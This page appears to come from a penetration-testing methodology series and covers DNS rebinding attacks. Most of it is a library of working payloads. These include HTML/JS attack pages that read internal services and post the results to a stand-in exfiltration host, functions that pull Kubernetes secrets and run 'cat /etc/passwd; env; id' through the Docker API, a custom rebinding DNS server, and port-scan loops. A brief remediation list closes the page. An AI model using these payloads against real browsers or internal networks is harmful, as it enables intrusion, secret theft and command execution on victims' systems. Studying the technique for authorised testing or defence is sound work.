---
title: "DNS Rebinding"
date: 2026-02-24
draft: false
---

# DNS Rebinding

> **Severity**: High | **CWE**: CWE-350, CWE-184
> **OWASP**: A01:2021 – Broken Access Control | A05:2021 – Security Misconfiguration

---

## What Is DNS Rebinding?

DNS rebinding attacks abuse the browser's same-origin policy (SOP) by manipulating DNS resolution. The attacker controls a domain whose DNS TTL is set very low. When a victim visits the attacker's page:

1. Browser resolves `evil.com` → attacker's IP (serves malicious JS)
2. JS runs in the victim's browser, waits for DNS TTL to expire
3. DNS record is changed: `evil.com` → `127.0.0.1` (or internal IP)
4. JS makes a cross-origin fetch to `evil.com` — browser resolves again → now gets `127.0.0.1`
5. SOP considers both requests same-origin (same domain `evil.com`) → request succeeds
6. Attacker JS reads the response from the internal service running on 127.0.0.1

**Attack targets**: internal services, router admin panels, Kubernetes API, Docker daemon, Prometheus, Consul, Jupyter notebooks, development servers — any HTTP service on localhost or private network accessible from the victim's browser.

```
Timeline:
T=0:    DNS: evil.com → 1.2.3.4 (attacker server, TTL=1s)
T=0:    Victim visits evil.com → receives malicious JS payload
T=1s:   Attacker changes DNS: evil.com → 192.168.1.1 (router)
T=1s+ε: JS fetches http://evil.com/admin/config
         Browser re-resolves evil.com → 192.168.1.1
         Request goes to router admin panel
         Response returned to JS (same-origin!)
T=1s+ε: JS exfiltrates router config to attacker
```

---

## Discovery Checklist

**Phase 1 — Identify Internal Service Attack Surface**
- [ ] Target is behind NAT (typical home/corporate user) — router panel at 192.168.1.1 or 192.168.0.1
- [ ] Developer machines running local servers: `:3000`, `:8080`, `:5000`, `:8888` (Jupyter), `:6006` (TensorBoard)
- [ ] Internal microservices with no authentication (assuming private network = trusted)
- [ ] Docker daemon REST API on port 2375 (unauthenticated)
- [ ] Kubernetes API server on port 6443 or 8080
- [ ] Redis on `:6379`, Memcached on `:11211`, Elasticsearch on `:9200`
- [ ] CI/CD: Jenkins `:8080`, GoCD `:8153`, TeamCity `:8111`
- [ ] Service mesh: Consul `:8500`, Vault `:8200`, Nomad `:4646`
- [ ] Prometheus `:9090`, Grafana `:3000`, Kibana `:5601`

**Phase 2 — Test DNS Rebinding Feasibility**
- [ ] Does the target service return CORS headers? (`Access-Control-Allow-Origin: *` → just use CORS, no rebinding needed)
- [ ] Is there a DNS cache / resolver that caches aggressively? (enterprise resolvers may ignore TTL=0)
- [ ] Test with rebind.network or Singularity to confirm rebinding works in target browser
- [ ] Check if target service validates `Host` header (some services only respond to `localhost` Host)
- [ ] Check if browser respects very low TTL (most do for TTL ≥ 1s; Chrome respects TTL=0)

**Phase 3 — Execute Attack**
- [ ] Set up rebinding domain with DNS TTL=0 or TTL=1
- [ ] Serve initial payload page that waits for DNS flip
- [ ] After rebinding, send requests to internal service via the rebound domain
- [ ] Collect responses via attacker-controlled exfiltration channel
- [ ] Test Host header injection to bypass any host-based filtering

---

## Payload Library

### Payload 1 — Basic Rebinding Attack Page

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
// Configuration:
const REBIND_DOMAIN = "YOUR_REBIND_DOMAIN.rebind.network"; // or your domain
const TARGET_PORT = 8080;
const EXFIL_URL = "https://attacker.com/collect";
const REBIND_DELAY = 5000;  // wait for DNS TTL to expire (ms)

async function fetchInternal(path) {
    const url = `http://${REBIND_DOMAIN}:${TARGET_PORT}${path}`;
    try {
        const r = await fetch(url, {
            credentials: 'include',
            cache: 'no-store'  // prevent cache from returning old IP
        });
        return await r.text();
    } catch(e) {
        return null;
    }
}

async function attack() {
    // Phase 1: Confirm initial page served (DNS points to attacker):
    const initialCheck = await fetchInternal('/healthz');

    // Phase 2: Wait for DNS to flip to internal IP:
    await new Promise(r => setTimeout(r, REBIND_DELAY));

    // Phase 3: Try fetching internal resources:
    const targets = ['/', '/api', '/metrics', '/admin', '/env', '/actuator'];
    const results = {};

    for (const path of targets) {
        const data = await fetchInternal(path);
        if (data) {
            results[path] = data.substring(0, 2000);  // first 2KB
        }
    }

    // Phase 4: Exfiltrate:
    await fetch(EXFIL_URL, {
        method: 'POST',
        body: JSON.stringify({
            target: REBIND_DOMAIN + ':' + TARGET_PORT,
            timestamp: Date.now(),
            data: results
        })
    });
}

// Start attack immediately:
attack();
</script>
<p>Loading application...</p>
</body>
</html>
```

### Payload 2 — Host Header Rebinding Bypass

```html
<script>
// Some services validate Host header = "localhost" or "127.0.0.1"
// After DNS rebind, our Host header will say "evil.rebind.network"
// → service rejects it
// Bypass: use XMLHttpRequest and override Host header... can't do that from browser
// Alternative: iframe + target=_blank + window.name exfil

// Method 1: WebSocket after rebind (Host header is set automatically):
async function wsRebind() {
    await new Promise(r => setTimeout(r, 5000)); // wait for DNS flip

    const ws = new WebSocket(`ws://REBIND_DOMAIN:PORT/ws`);
    ws.onopen = () => {
        ws.send(JSON.stringify({type: "cmd", data: "list_keys"}));
    };
    ws.onmessage = (evt) => {
        exfil(evt.data);
    };
}

// Method 2: Re-trigger DNS after rebind to force resolution:
// Make multiple requests — after TTL expires, DNS will be re-resolved
async function rebindWithRetry() {
    const domain = "REBIND_DOMAIN";
    const port = TARGET_PORT;

    let attempts = 0;
    const maxAttempts = 30;

    while (attempts < maxAttempts) {
        await new Promise(r => setTimeout(r, 1000));
        attempts++;

        try {
            // cache: 'no-store' forces DNS re-lookup in most browsers:
            const r = await fetch(`http://${domain}:${port}/`, {
                cache: 'no-store',
                mode: 'no-cors'  // allow request even if CORS fails
            });

            // If we get a response that looks like internal service:
            const text = await r.text().catch(() => '');
            if (text.includes('internal') || text.includes('admin') || r.status < 400) {
                console.log(`[+] Rebind successful at attempt ${attempts}`);
                return text;
            }
        } catch(e) {
            // CORS error = attacker server is responding (not yet rebound)
            // No error or different error = internal service responding
        }
    }
}

// Method 3: DNS rebind via subdomain chain:
// sub1.evil.com → A 1.2.3.4
// sub2.evil.com → A 127.0.0.1
// Use custom DNS server that alternates responses per-request
</script>
```

### Payload 3 — Target-Specific Payloads

```javascript
// Kubernetes API Server (port 8080 — unauthenticated, or 6443 with stolen token):
async function attackK8s() {
    const base = `http://REBIND:8080`;
    const paths = [
        '/api/v1/namespaces',
        '/api/v1/pods',
        '/api/v1/secrets',
        '/api/v1/configmaps',
        '/apis/apps/v1/deployments',
    ];
    for (const p of paths) {
        const r = await fetch(base + p);
        exfil(p, await r.text());
    }
}

// Docker daemon (port 2375, unauthenticated):
async function attackDocker() {
    const base = `http://REBIND:2375`;
    const info = await (await fetch(`${base}/info`)).json();
    const containers = await (await fetch(`${base}/containers/json?all=1`)).json();

    // Execute command in container:
    const execCreate = await fetch(`${base}/containers/${containers[0].Id}/exec`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            AttachStdout: true, AttachStderr: true,
            Cmd: ["/bin/sh", "-c", "cat /etc/passwd; env; id"]
        })
    });
    const exec = await execCreate.json();
    await fetch(`${base}/exec/${exec.Id}/start`, {method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({Detach: false, Tty: false})
    });
}

// Prometheus (port 9090) — metric/secret extraction:
async function attackPrometheus() {
    const base = `http://REBIND:9090`;
    // List all metrics:
    const meta = await (await fetch(`${base}/api/v1/label/__name__/values`)).json();
    // Query specific sensitive metrics:
    const query = await (await fetch(`${base}/api/v1/query?query=up`)).json();
    // Targets (may show internal IPs/hostnames):
    const targets = await (await fetch(`${base}/api/v1/targets`)).json();
    exfil('prometheus', {meta, query, targets});
}

// Redis (port 6379) — via raw TCP using WebSocket or DNS rebind trick:
// Redis over HTTP doesn't work directly — but try:
async function probeRedis() {
    // Redis responds to HTTP requests with error containing config data
    try {
        const r = await fetch('http://REBIND:6379/', {mode: 'no-cors'});
        // Response will be Redis error: "-ERR wrong number of arguments..."
        // which leaks that Redis is running
    } catch(e) {}
}

// Jupyter Notebook (port 8888):
async function attackJupyter() {
    const base = `http://REBIND:8888`;
    // List all notebooks:
    const contents = await (await fetch(`${base}/api/contents`)).json();
    // Get auth token from running instance:
    const login = await fetch(`${base}/api/kernels`, {credentials: 'include'});
    exfil('jupyter', await login.json());
}

// Router admin (192.168.1.1 — rebind to router IP):
async function attackRouter() {
    const base = `http://192.168.1.1`;
    // Common router endpoints:
    for (const path of ['/', '/admin', '/cgi-bin/luci', '/setup.cgi']) {
        try {
            const r = await fetch(base + path, {mode: 'no-cors'});
            exfil('router' + path, 'exists');
        } catch(e) {}
    }
}
```

### Payload 4 — Singularity Framework Setup

```bash
# Singularity — DNS rebinding framework:
git clone https://github.com/nccgroup/singularity
cd singularity

# Build:
cd html && go build -o singularity singularity.go

# Configure (singularity.json):
cat > singularity.json << 'EOF'
{
  "DNSRebindStrategy": "ma",
  "ResponseIPAddr": "ATTACKER_PUBLIC_IP",
  "RebindIPAddr": "192.168.1.1",
  "HTTPServerPort": 8080,
  "DNSServerPort": 53,
  "ResponseRebindAfterMs": 3000
}
EOF

# Run:
sudo ./singularity -rIP 192.168.1.1 -hIP ATTACKER_IP -l 53 -p 8080

# DNS rebind via Singularity — victim visits:
# http://SINGULARITY_DOMAIN:8080/?targetHost=192.168.1.1&targetPort=80&attackerHost=SINGULARITY_DOMAIN&attackerPort=8080&victim=http%3A%2F%2FSINGULARITY_DOMAIN%3A8080%2Fattack.html

# rebind.network (hosted DNS rebinding service for testing):
# Register subdomain at rebind.network
# Your domain: YOURTOKEN.rebind.network
# Initial IP: your attacker server
# Flip to: 127.0.0.1 or internal IP

# DNS rebind via whonow (simple DNS server):
git clone https://github.com/brannondorsey/whonow
cd whonow && npm install
# Usage: node whonow.js --ip1=ATTACKER_IP --ip2=127.0.0.1 --responseCount=2
# Domain: 1.2.3.4.rebind.127.0.0.1.ns.YOURDOMAIN.com
# Responds: first 2 queries → 1.2.3.4, then → 127.0.0.1

# Test rebinding feasibility:
dig @ATTACKER_NS_SERVER evil.com  # check if low TTL is honored
# TTL = 0: not cached, immediate re-resolution
# TTL = 1: cached for 1 second
```

### Payload 5 — Browser-Side DNS Cache Flushing

```html
<script>
// Force DNS cache expiry by hammering requests:
// Different browsers have different DNS cache behavior:
// Chrome: min TTL = 1s, caches for TTL or 60s (whichever is less)
// Firefox: min TTL = 10s (configurable via network.dnsCacheExpiration)
// Safari: varies

// Technique 1: Image tag storm — force many DNS lookups:
function flushDNSCache(domain, port, iterations = 100) {
    for (let i = 0; i < iterations; i++) {
        const img = new Image();
        img.src = `http://${domain}:${port}/favicon.ico?t=${Date.now()}&i=${i}`;
    }
}

// Technique 2: Iframe approach — each iframe forces DNS lookup:
function flushWithIframes(domain, port) {
    for (let i = 0; i < 20; i++) {
        const iframe = document.createElement('iframe');
        iframe.src = `http://${domain}:${port}/?flush=${i}&t=${Date.now()}`;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        setTimeout(() => iframe.remove(), 5000);
    }
}

// Technique 3: Worker-based parallel requests:
const workerCode = `
    setInterval(async () => {
        try {
            await fetch('http://DOMAIN:PORT/?t=' + Date.now(), {cache: 'no-store'});
        } catch(e) {}
    }, 100);
`;
const blob = new Blob([workerCode], {type: 'application/javascript'});
const worker = new Worker(URL.createObjectURL(blob));

// Detection: response changes from attacker content → internal content:
async function detectRebind(domain, port, attackerIndicator) {
    while (true) {
        try {
            const r = await fetch(`http://${domain}:${port}/`, {cache: 'no-store'});
            const text = await r.text();
            if (!text.includes(attackerIndicator)) {
                console.log('[+] DNS rebind successful! Internal service responding.');
                return text;
            }
        } catch(e) {}
        await new Promise(r => setTimeout(r, 500));
    }
}
</script>
```

### Payload 6 — DNS Rebinding via Single-IP DNS Trick

```bash
# For environments with strict DNS resolvers (no wildcard / only legitimate DNS):
# Use a legitimate domain with very low TTL and rapid record rotation

# Custom DNS server (Python) — responds differently to each query:
python3 << 'EOF'
from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import time

class RebindResolver(BaseResolver):
    def __init__(self, real_ip, target_ip, flip_after=3):
        self.real_ip = real_ip      # attacker's server IP
        self.target_ip = target_ip  # internal IP to rebind to
        self.flip_after = flip_after
        self.query_count = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        self.query_count[qname] = self.query_count.get(qname, 0) + 1

        # First N queries → real IP, then → target IP:
        if self.query_count[qname] <= self.flip_after:
            ip = self.real_ip
            print(f"[DNS] {qname} → {ip} (query #{self.query_count[qname]})")
        else:
            ip = self.target_ip
            print(f"[DNS] {qname} → {ip} (REBOUND! query #{self.query_count[qname]})")

        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, ttl=0, rdata=A(ip)))
        return reply

resolver = RebindResolver(
    real_ip='ATTACKER_IP',
    target_ip='127.0.0.1',  # or: '192.168.1.1', '10.0.0.1'
    flip_after=3
)
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start_thread()
print(f"[*] DNS rebinding server running...")
input("Press Enter to stop")
EOF

# dnslib install:
pip3 install dnslib
```

---

## Tools

```bash
# Singularity DNS rebinding framework:
git clone https://github.com/nccgroup/singularity

# rebind.network — hosted rebinding service for testing:
# https://rebind.network

# whonow — simple DNS rebinding server:
git clone https://github.com/brannondorsey/whonow

# Detect internal services via DNS rebinding (automated):
# rbndr.us — public DNS rebinding service (testing only):
# Use: 7f000001.c0a80001.rbndr.us
# First byte-pairs = IP1 (127.0.0.1), second = IP2 (192.168.0.1)
# Service alternates between the two IPs on each query

# Test if a port is open on localhost/internal via timing:
# (No DNS rebinding needed — pure timing/error detection)
python3 << 'EOF'
import requests, time

# Ports that typically run sensitive services:
ports = [80, 443, 2375, 2376, 3000, 4646, 5000, 6379, 8080, 8443,
         8500, 8888, 9090, 9200, 10250, 6443]

for port in ports:
    try:
        start = time.time()
        requests.get(f'http://localhost:{port}/', timeout=0.5)
        elapsed = time.time() - start
        print(f'Port {port}: OPEN (responded in {elapsed:.3f}s)')
    except requests.exceptions.ConnectionError:
        print(f'Port {port}: CLOSED (connection refused)')
    except requests.exceptions.Timeout:
        print(f'Port {port}: FILTERED (timeout)')
EOF

# Burp Suite Professional — detect via collaborator:
# If server-side SSRF isn't possible, DNS rebinding targets client-side
# Use Collaborator payload in any field that might trigger client-side fetches

# Scan for internal services after rebind confirmation:
for port in 80 443 2375 3000 6379 8080 8443 8888 9090 9200; do
  curl -s --max-time 1 "http://REBIND_DOMAIN:${port}/" -o /dev/null -w "%{http_code}" \
    && echo " → port $port OPEN" || echo " → port $port closed"
done
```

---

## Remediation Reference

- **Validate `Host` header**: internal services should only respond to requests with `Host: localhost` or `Host: 127.0.0.1` — reject requests with unexpected `Host` values
- **Bind to localhost only**: services not intended for external access should bind to `127.0.0.1`, not `0.0.0.0`
- **DNS-based rebinding protection**: use `--bind-address` flags on admin interfaces; many tools (Jupyter, Grafana) have `--host` flags specifically for this
- **DNS rebind protection in resolvers**: enterprise DNS resolvers (Unbound, BIND) can block responses where private RFC-1918 IPs appear for public domains — enable `private-address` in Unbound
- **Authentication on all internal services**: assume the private network is hostile — require authentication on Redis, Elasticsearch, Prometheus, Docker daemon, etc.
- **Browser-level**: Chrome and Firefox have added DNS rebinding protections for `127.0.0.1` — but these don't cover all internal IPs
- **HTTPS with certificate pinning**: TLS certificates cannot be issued for `localhost` pointing to external domains — HTTPS services are more resistant to rebinding

*Part of the Web Application Penetration Testing Methodology series.*
